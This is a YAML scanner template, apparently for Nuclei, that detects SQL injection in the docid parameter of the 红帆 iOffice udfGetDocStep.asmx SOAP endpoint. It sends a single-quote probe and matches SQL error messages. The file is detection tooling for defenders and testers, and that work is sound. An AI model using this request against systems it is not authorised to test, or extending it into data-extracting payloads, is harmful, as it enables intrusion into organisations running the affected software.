config/pocs/hongfan-ioffice-udfgetdocstep-sqli.yaml

id: hongfan-ioffice-udfgetdocstep-sqli

info:
  name: 红帆OA udfGetDocStep.asmx - SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects SQL Injection vulnerabilities in 红帆 iOffice's `udfGetDocStep.asmx` endpoint.
    The vulnerability is present in the `docid` parameter, which is prone to SQL injection attacks such as
    Boolean-based blind, time-based blind, error-based, and stacked queries.
  tags: 红帆-ioffice

http:
  - raw:
      - |
        POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: text/xml; charset=utf-8
        SOAPAction: http://tempuri.org/GetDocStep

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetDocStep xmlns="http://tempuri.org/">
              <docid>1'</docid>
            </GetDocStep>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "SqlException"
          - "语法错误"
        part: body